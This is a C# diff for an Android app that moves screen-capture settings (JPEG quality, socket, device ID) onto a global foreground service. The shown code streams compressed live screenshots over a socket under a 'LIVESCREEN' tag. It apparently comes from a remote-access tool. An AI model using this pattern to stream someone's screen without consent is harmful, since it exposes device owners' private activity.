@@ -18,10 +18,7 @@ namespace Task2
 
         public JniManagedPeerStates JniManagedPeerState;
 
-        public static int kalite = 70;
-
-        public static Socket screenSock;
-        public static string ID = "";
+        
         public void Dispose()
         {
 
@@ -63,13 +60,13 @@ namespace Task2
                     image.Close();
                     using (System.IO.MemoryStream fos = new System.IO.MemoryStream())
                     {
-                        bitmap.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, kalite, fos);
-                        byte[] dataPacker = ForegroundService._globalService.MyDataPacker("LIVESCREEN", StringCompressor.Compress(fos.ToArray()), ID);
+                        bitmap.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, ForegroundService._globalService.kalite, fos);
+                        byte[] dataPacker = ForegroundService._globalService.MyDataPacker("LIVESCREEN", StringCompressor.Compress(fos.ToArray()), ForegroundService._globalService.ID);
                         try
                         {
-                            if (screenSock != null)
+                            if (ForegroundService._globalService.screenSock != null)
                             {
-                                screenSock.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
+                                ForegroundService._globalService.screenSock.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                                 System.Threading.Tasks.Task.Delay(1).Wait();
                             }
                         }
